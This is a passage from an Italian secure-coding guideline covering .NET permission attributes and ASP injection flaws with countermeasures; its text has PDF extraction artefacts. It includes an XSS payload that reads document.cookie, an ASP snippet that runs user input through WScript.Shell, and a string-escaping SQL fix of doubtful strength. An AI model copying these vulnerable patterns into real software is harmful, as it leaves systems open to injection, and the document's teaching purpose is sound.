Analogamente la sicurezza delle dichiarazioni conse nte di controllare l'ereditarietà delle classi. È p ossibile 
utilizzare InheritanceDemand per eseguire le seguen ti operazioni: 
• Imporre che le classi derivate abbiano un'identità o un'autorizzazione specificate. 
• Imporre alle classi derivate di sostituire metodi s pecifici per avere un'identità o un'autorizzazione 
specifici. 
L'esempio seguente illustra come proteggere una cla sse pubblica, limitando l'accesso, con la richiesta  che i 
chiamanti si firmino con un nome sicuro specifico.  
 
 
 
Linee guida per lo sviluppo sicuro Pag. 106  a 156  
 
Viene qui utilizzata la funzione  StrongNameIdentit yPermissionAttribute con una richiesta di nome sicu ro: 
  
[StrongNameIdentityPermissionAttribute(SecurityActi on.Demand, 
PublicKey= "…hex…" , Name= "App1" , Version= "0.0.0.0" )] 
public class Class1 
{ 
 
} 
7.6.10.5  Protezione e campi pubblici di sola lettura 
Non utilizzare mai campi pubblici di sola lettura d alle librerie managed in quanto i campi pubblici di  sola 
lettura possono essere modificati.  
Alcune classi di framework .NET includono campi pub blici di sola lettura che contengono parametri di 
confine specifici per la piattaforma. Ad esempio, i l campo InvalidPathChars è un array che descrive i 
caratteri che non sono consentiti in una stringa de l percorso di file. 
I valori dei campi pubblici di sola lettura come In validPathChars possono essere modificati dal codice  o dal 
codice che condivide il dominio di applicazione. Se  si utilizzano i campi pubblici in sola lettura, co me 
InvalidPathCharsi, il codice dannoso può alterare l e definizioni dei limiti e utilizzare il codice in modi 
inaspettati. 
Nella versione 2.0 e versioni successive di .NET Fr amework, è necessario utilizzare metodi che restitu iscono 
un nuovo array anziché utilizzare i campi di array pubblici. Ad esempio, invece di utilizzare il campo  
InvalidPathChars, è necessario utilizzare il metodo  GetInvalidPathChars. 
Si noti che i tipi di .NET Framework non utilizzano  i campi pubblici per definire internamente i tipi di confini. 
Al contrario, il framework .NET utilizza campi priv ati separati. La modifica dei valori di questi camp i pubblici 
non altera il comportamento dei tipi di .NET Framew ork. 
7.6.10.6  Esclusione di classi e membri utilizzati da codice non attendibile 
Utilizzare le dichiarazioni illustrate in questa se zione per impedire che classi e metodi specifici, n onché 
proprietà e eventi, siano utilizzati da un codice p arzialmente attendibile. Applicare queste dichiaraz ioni a 
una classe, applica la protezione a tutti i suoi me todi, proprietà e eventi; tuttavia, si noti che l'a ccesso sul 
campo non è influenzato dalla sicurezza dichiarativ a. Si noti inoltre che le richieste di collegamento  aiutano 
a proteggere solo i chiamanti immediati e potrebber o essere ancora soggetti ad attacchi. 
In associazione con il nome sicuro, un LinkDemand v iene applicato a tutti i metodi, le proprietà e gli  eventi 
accessibili a livello pubblico per limitarne l'uso a chiamanti affidabili. Per disattivare questa funz ionalità, è 
necessario applicare l'attributo AllowPartiallyTrus tedCallersAttribute. Pertanto, la selezione esplici ta di 
classi per escludere i chiamanti non attendibili è necessaria solo per assemblies non assegnate o asse mblies 
con questo attributo; è possibile utilizzare queste  dichiarazioni per contrassegnare un sottoinsieme d i tipi in 
esso che non sono destinati a chiamanti non attendi bili. 
 
Gli esempi seguenti mostrano come evitare che class i e membri siano utilizzati da codice non attendibi le. 
Esempi: 
Per classi pubbliche non sealed: 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, 
Name= "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )] 
public  class  CanDeriveFromMe 
{ 
} 
Per classi pubbliche sealed: 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )] 
public  sealed  class  CannotDeriveFromMe 
{ 
} 
 
 
Linee guida per lo sviluppo sicuro Pag. 107  a 156  
 
Per classi pubbliche abstract: 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, 
Name= "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )] 
public  abstract  class  CannotCreateInstanceOfMe_CanCastToMe{} 
Per funzioni pubbliche virtual: 
class  Base1  
{ 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, 
Name= "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )] 
  public  virtual  void  CanOverrideOrCallMe() {} 
  } 
Per funzioni pubbliche abstract: 
abstract class Base2{ 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, Name = 
"FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name = "FullTrust" )] 
public  abstract  void  MustOverrideMe(); 
} 
Per funzioni di aggiornamento pubblico in cui la cl asse di base non richiede una completa fiducia: 
class  Derived : Base1 
{   
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Demand, Name= "FullTrust" )]   
  public  override  void  CanOverrideOrCallMe()  
  { 
    base .CanOverrideOrCallMe(); 
  } 
} 
Per funzioni di aggiornamento pubblico in cui la cl asse di base richiede una completa fiducia: 
class  Derived : Base1 
{   
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )]   
  public  override  void  CanOverrideOrCallMe()  
  { 
    base .CanOverrideOrCallMe(); 
  } 
} 
Per pubbliche interfacce: 
public  interface  ICanCastToMe  
{ 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name = "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, Name = 
"FullTrust" )] 
void  CanImplementMe(); 
} 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name = "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, Name = 
"FullTrust" )] 
class  Implemented : ICanCastToMe 
{ 
  public  void  CanImplementMe() 
  { 
  } 
 
 
Linee guida per lo sviluppo sicuro Pag. 108  a 156  
 
} 
7.6.10.7  Definizione delle classi 
Evitare l’utilizzo di classi Wrapper. Se il wrapper  è degno di maggiore fiducia rispetto al codice che  lo 
utilizza, si può aprire un insieme unico di debolez ze di sicurezza. Qualsiasi cosa fatta per conto di un 
chiamante, le cui autorizzazioni limitate non sono incluse nel controllo di sicurezza appropriato, è u na 
potenziale debolezza da sfruttare. 
Mai abilitare qualcosa attraverso il Wrapper che il  chiamante non potrebbe fare su se stesso. Questo è  un 
pericolo quando si effettua qualcosa che comporta u n controllo di sicurezza limitato. Quando i control li a 
livello singolo sono coinvolti, l'interposizione de l codice di Wrapper tra il chiamante reale e l'elem ento API 
in questione può facilmente causare il controllo di  sicurezza per avere successo se non dovrebbe, quin di 
indebolire la sicurezza. 
7.6.10.8  User input 
I dati utente, qualsiasi tipo di input (dati da una  richiesta Web o un URL, input ai controlli di un'a pplicazione 
Microsoft Windows Form e così via), possono influen zare negativamente il codice perché spesso vengono 
utilizzati direttamente come parametri per chiamare  altro codice. Questa situazione è analoga a un mod ulo 
dannoso che chiama il codice con parametri estranei , e dovrebbero essere prese le stesse precauzioni.  
Per cercare questi possibili bug, cercate di immagi nare quali siano i valori possibili e valutare se i l codice che 
visualizza questi dati possa gestire tutti questi c asi. È possibile risolvere questi bug attraverso ‘a dozione 
della tecnica della white list, per cui si accettan o solo i dati previsti e si rifiutano tutti gli alt ri. 
 
Alcune considerazioni importanti che coinvolgono i dati utente includono quanto segue: 
• tutti i dati contenuti in una risposta del server v engono eseguiti sulla pagina web dal client. Se il tuo 
web server prende i dati utente e li inserisce nell a pagina Web restituita, potrebbe includere ad 
esempio un tag <script> e ed essere eseguito (attac co XSS); 
• il client può richiedere qualsiasi URL; 
• la funzione eval(datiUtente) può fare qualsiasi cos a; 
• fare attenzione ai nomi utente che potrebbero avere  più di un formato canonico. Ad esempio, in 
Microsoft Windows 2000, è possibile utilizzare spes so il modulo di nome utente MYDOMAIN \ o il 
modulo username@mydomain.example.com; 
• prendere in considerazione i percorsi ingannevoli o  non validi: quelli forniti di ripetuti “..\” e que lli 
molto lunghi; 
• può esserci un uso sconsiderato del carattere (*); 
• fare attenzione all’espansione dei token (% token%) ; 
• verificare che non vi siano strani forme di percors i con un significato speciale; 
• appurare la correttezza delle versioni brevi di nom i file lunghi, come longfi ~ 1 per longfilename. 
7.6.10.9  Concorrenza 
Utilizzo di synchronized per la gestione della memo ria 
Se un metodo di una classe Dispose  non è synchronized , è possibile che il codice di cleanup all'interno di 
Dispose sia eseguito più di una volta, come illustr ato nell'esempio seguente.  
Esempio: 
void  Dispose()  
{ 
  if ( myObj != null  )  
  { 
    Cleanup(myObj); 
    myObj = null ; 
  } 
} 
 
 
Linee guida per lo sviluppo sicuro Pag. 109  a 156  
 
Poiché questa implementazione di Dispose  non è synchronized , è possibile che Cleanup  sia chiamato da 
un primo thread e poi un secondo thread prima che _ myObj  sia impostato a null . In base a ciò che accade 
quando viene eseguito il codice di cleanup, si può trattare di un problea di sicurezza o meno. 
Un problema importante con l'implementazione di Dis pose non sincronizzata comporta un reale problema 
nella gestione di risorse. La deallocazione impropr ia può causare una gestione dell’utilizzo errata, c he 
spesso conduce a vulnerabilità di sicurezza. 
In alcune applicazioni, potrebbe essere possibile c he altri thread accedano ai membri della classe pri ma che 
i loro costruttori di classe siano completamente es eguiti. È necessario esaminare tutti i costruttori di classe 
per assicurarsi che non ci siano problemi di protez ione e sincronizzare i thread, se necessario. 
7.6.10.10  Serializzazione e deserializzazione 
Poiché la serializzazione può consentire ad altri m oduli di visualizzare o modificare i dati di istanz a 
dell'oggetto che altrimenti sarebbero inaccessibili , è necessaria una autorizzazione speciale per la 
serializzazione del codice. Per default questa auto rizzazione non viene fornita al codice scaricato da  
internet o intranet; solo al codice sul computer lo cale è concessa questa autorizzazione. 
Normalmente, tutti i campi dell'istanza di un ogget to vengono serializzati, il che significa che vengo no 
serializzati anche i dati. È possibile che il codic e possa interpretare il formato per determinare i v alori dei 
dati, indipendentemente dall'accessibilità dei sing oli membri. Analogamente, la deserializzazione estr ae i 
dati dalla rappresentazione serializzata e imposta lo stato dell'oggetto direttamente, di nuovo 
indipendentemente dalle regole di accessibilità. 
Qualsiasi oggetto che potrebbe contenere dati sensi bili alla sicurezza dovrebbe essere reso non serial izable. 
Se trettamente necessario adottare questa tecnica, occorre comunque creare campi specifici non 
serializzabili, quelli che - per esempio - contenga no dati sensibili. Se questo non può essere fatto, tenere 
presente che questi dati saranno esposti a qualsias i modulo che abbia l'autorizzazione a 
serializzare/deserializzare. In tal caso assicurars i che nessun modulo non attendibile possa ottenere tale 
autorizzazione. 
L'interfaccia ISerializable  è destinata esclusivamente all'infrastruttura di s erializzazione. Se si fornisce 
una serializzazione personalizzata implementando ISerializable , assicurarsi di adottare le seguenti 
precauzioni:  
Il metodo GetObjectData  dovrebbe essere protetto in modo esplicito o richi edendo l'autorizzazione 
SecurityPermission con SerializationFormatter speci ficata. Occorre anche assicurarsi che non venga 
rilasciata alcuna informazione sensibile con l'outp ut del metodo.  
Esempio: 
[SecurityPermissionAttribute(SecurityAction.Demand, SerializationFormatter = true )] 
public  override  void  GetObjectData(SerializationInfo info,  
StreamingContext context) 
{ 
} 
Il costruttore speciale utilizzato per la serializz azione dovrebbe inoltre eseguire una convalida comp leta 
degli input e dovrebbe essere dichiarata private o protected per proteggere la classe da un uso improp rio e 
abusivo.  
7.7  ASP 
ASP (Active Server Page) identifica non un linguagg io di programmazione, ma una tecnologia Microsoft, per 
la creazione di pagine web dinamiche attraverso lin guaggi di script come VBScript e Microsoft JScript.  ASP 
sfrutta non solo la connettività del web server ma,  si può interfacciare (attraverso oggetti COM) con tutte le 
risorse disponibili sul server e, in maniea traspar ente, sfruttare tecnologie diverse. 
Vengono di seguito analizzate le principali vulnera bilità e relative contromisure da adottare. 
7.7.1  Cross-site scripting (XSS) 
Come riconoscerla 
 
 
Linee guida per lo sviluppo sicuro Pag. 110  a 156  
 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte intregrante della pagina all’interno di un database e rispristinato ogni qual volta la pagi na in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). Occo rre controllare il tipo del dato, la sua dimensione , 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Codificare completamente tutti i dati dinamici prim a di incorporarli (encoding). La codifica 
dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si 
aspetta che possa esserci codice HTML abusivo, occo rre codificare gli eventuali tag HTML, se ci si 
potrebbe trovare di fronte a uno script, allora bis ogna codificare gli elementi sintattici di Javascri pt, 
ecc. 
• Si consiglia di utilizzare la libreria di codifica ESAPI di OWASP. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
Esempio: 
ASP offre la possibilità di fare l’encoding delle s tringhe dell’input (HTMLEncode): 
<% 
  Function XSS_Filter(MyQueryString) 
    If IsNumeric(MyQueryString) Then 
      MyQueryString = CInt(MyQueryString) 
    Else 
      MyQueryString = Server.HTMLEncode(MyQueryStri ng) 
    End If 
    XSS_Filter = MyQueryString 
  End Function 
%> 
Tale funzione verrebbe chiamata in questo modo: 
<% 
  Dim parametro 
  parametro = XSS_Filter(Request.QueryString("param etro")) 
%> 
 
 
Linee guida per lo sviluppo sicuro Pag. 111  a 156  
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html  CWE-79: Improper 
Neutralization of Input During Web Page Generation ('Cross-site Scripting') 
7.7.2  Code Injection 
Come riconoscerla 
L'applicazione esegue del codice ricevuto attravers o l’input che non è stato sufficientemente verifica to. Un 
utente in grado di inserire codice arbitrario può p rendere il controllo dell’applicazione e del server , se non 
sono state adottate tecniche di difesa in profondit à. 
Come difendersi. 
È vietata qualsiasi esecuzione dinamica di codice r icevuto da canali non attendibili. Se è prorpio nec essario 
compilare ed eseguire dinamicamente del codice dina mico, occorre allore predisporre una sandbox isolat a, 
ad esempio AppDomain di .NET o un thread isolato.  
Devono essere effettuati tutti i controlli possibil i per validare il codice in ingresso. 
Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di priv ilegi 
non necessari. 
Se è possibile optare per isolare tutta l'esecuzion e dinamica utilizzando un account utente separato e  
dedicato che abbia privilegi solo per le operazioni  e i file specifici utilizzati dal codice da esegui re, in base al 
principio denominato "Principle of Least Privilege" . Il principio stabilisce che agli utenti venga att ribuito il 
più basso livello di “diritti” che possano, detener e rimanendo comunque in grado di compiere il propri o 
lavoro. 
 
Esempio: 
Il seguente codice permette di filtrare eventuale c odice dannoso: 
<% 
strHTML = "<s" & "cript>alert(document.cookie);</s"  & "cript>" 
 
' code injection 
Response.Write(strHTML) 
 
' protetto 
Response.Write(Server.HtmlEncode(strHTML)) 
%> 
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/94.html  , 
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
 
7.7.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
Attraverso questa vulnerabilità l'applicazione vien e portata ad eseguire i comandi dell’attaccante. 
L'operazione spesso viene effettuata utilizzando st ringhe di input controllate dall'utente, sulle qual i non 
viene effettuata alcuna verifica. 
Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il sistema o per 
la sicurezza dei dati. 
 
 
Linee guida per lo sviluppo sicuro Pag. 112  a 156  
 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli 
privilegi strettamente necessari, in base al princi pio denominato "Principle of Least Privilege". Il 
principio stabilisce che agli utenti venga attribui to il più basso livello di “diritti” che possano 
detenere rimanendo comunque in grado di compiere il  proprio lavoro. 
 
Esempio: 
Uno script ASP che invoca una shell di Sistema, uti lizzando l’input utente può essere molto pericolosa : 
   <% 
Set oWSH= Server.CreateObject("WScript.Shell") 
oWSH.Run Request.QueryString("parametro")+ “ param1  param2”, 1, True 
set oWSH = nothing 
   %> 
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/77.html , 
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
7.7.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al al databas e oppure al server. 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database 
oppure al server. Utilizzando strumenti e modifiche  di testo semplici, l'aggressore potrebbe essere in  grado 
di eseguire una delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se i valori immessi sono stati verificati in misura 
insufficiente o non sono stati affatto verificati, la stringa di connessione potrebbe essere manipolat a ad arte 
a vantaggio dell’attaccante. 
 
Come difendersi 
 
 
Linee guida per lo sviluppo sicuro Pag. 113  a 156  
 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). In g enerale, è necessario controllare il tipo del dato,  la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente 
una stringa di connessione evitare di includere l'i nput dell'utente. In ogni caso, utilizzare utilità 
basate sulla piattaforma, come SqlConnectionStringB uilder di .NET, o almeno codificare l'input 
validato come il piu' idoneo per la piattaforma uti lizzata. 
• Le stringhe di connessione possono essere custodite  nel file web.config.  Si tratta di una scelta 
migliore rispetto a comporle a runtime con l’input dell’utente. Si separa così l’applicazione dai 
metadati. Il file di configurazione in questione de ve essere messo in sicurezza attivano la modalità 
“protected configuration”, che permette di memorizz are le stringhe di connessione in forma 
crittografata (encrypted). 
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html , 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.7.5  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). Occorre controllare il tipo  del dato, la sua dimensione, l'intervallo di valid ità (range), 
il formato ed eventuali valori attesi (white list).  
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/90.html,  
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.7.6  XPath Injection 
Come riconoscerla  
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
 
 
Linee guida per lo sviluppo sicuro Pag. 114  a 156  
 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
Esempio :  
L'applicazione utilizza una stringa inserita dall'u tente per costruire una query XPath: 
from  sys import  stdin 
import  XPath 
print  'Insert item number: '  
userInput = stdin.readline()  
XPath.find( '//item'  + userInput, doc) 
 
La stringa inserita dall'utente viene trasformata i n un numero intero prima dell'uso nella query XPath : 
from  sys import  stdin 
import  XPath 
print  'Insert item number: '  
userInput = stdin.readline()  
XPath.find( '//item'  + str(int(userInput)), doc) 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html , 
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
7.7.7  Resource Injection 
Come riconoscerla  
Quando un'applicazione definisce un tipo di risorsa  o posizione in base all'input dell'utente, come un  nome 
file o un numero di porta, questi dati possono esse re manipolati per eseguire o accedere a risorse div erse. 
L’attacco di “path traversal” è un caso particolare  della resource injection. In tal caso a essere ini ettato è un 
path manipolativo che punta a risorse diverse nel f ile system. 
Se si utilizza l’input dell’utente per definire la porta sulla quale aprire un socket, si da all’utent e la possibilità 
di introdurre una backdoor attraverso la quale potr ebbe prendere il controllo del sistema. 
Come difendersi 
• In molti casi non è necessario aprire un socket man ualmente; meglio affidarsi a librerie e protocolli 
esistenti. 
• Tutti i dati inviati devono essere crittografati, s e sono sensibili. Nel dubbio se i dati siano sensib ili o 
possano diventarlo, meglio comunque crittografarli.  
• Qualsiasi input letto dal socket deve essere valida to. 
• Le applicazioni non dovrebbero utilizzare l’input d ell’utente per accedere a risorse del sistema. Nel 
caso si scelga di farlo, è obbligatorio validare l’ input, per esempio attraverso una white list. Se si  
consente la creazione di socket, controllare scrupo losamente questo tipo di attività. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html , 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
 
7.7.8  SQL Injection 
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri URL, devono essere sempre 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
 
 
Linee guida per lo sviluppo sicuro Pag. 115  a 156  
 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
• In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, scartando quelli che non rispettano la  white list Occorre controllare il tipo del dato, l a 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" 
(non fornire agli utenti permessi più elevati di qu elli strettamente necessari per svolgere il loro 
lavoro). 
 
Esempio: 
La query ottenuta dinamicamente tramite concatenazi one di stringhe viene resa sicura effettuando 
un’encoding mirato del valore in input. 
 
<% 
Function FixSQL(stringa) 
 stringa = Replace(stringa, "'", "''") 
 stringa = Replace(stringa, "%", "[%]") 
 stringa = Replace(stringa, "[", "[[]") 
 stringa = Replace(stringa, "]", "[]]") 
 stringa = Replace(stringa, "_", "[_]") 
 stringa = Replace(stringa, "#", "[#]") 
 FixSQL = stringa 
End function 
 
SQL = "SELECT * FROM tabella WHERE ID = '" & FixSQL (Request("ID")) & "'" 
%> 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html , 
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.8  ASP.NET 
ASP.NET è un insieme di tecnologie di sviluppo di s oftware per il web, commercializzate da Microsoft. 
Utilizzando queste tecnologie gli sviluppatori poss ono realizzare applicazioni Web e servizi Web (Web 
Service). Sebbene il nome ASP.NET derivi da ASP (Ac tive Server Pages), la vecchia tecnologia per lo sv iluppo 
web di Microsoft, esistono sostanziali differenze f ra le due. Infatti ASP.NET si basa, come tutte le 
applicazioni della famiglia Microsoft .NET, sul CLR  (Common Language Runtime). 
 
Vengono di seguito analizzate le principali vulnera bilità e relative contromisure da adottare. 
7.8.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
 
 
Linee guida per lo sviluppo sicuro Pag. 116  a 156  
 
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte intregrante della pagina all’interno di un database e rispristinato ogni qual volta la pagi na in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). Occo rre controllare il tipo del dato, la sua dimensione , 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Codificare completamente tutti i dati dinamici prim a di incorporarli (encoding). La codifica 
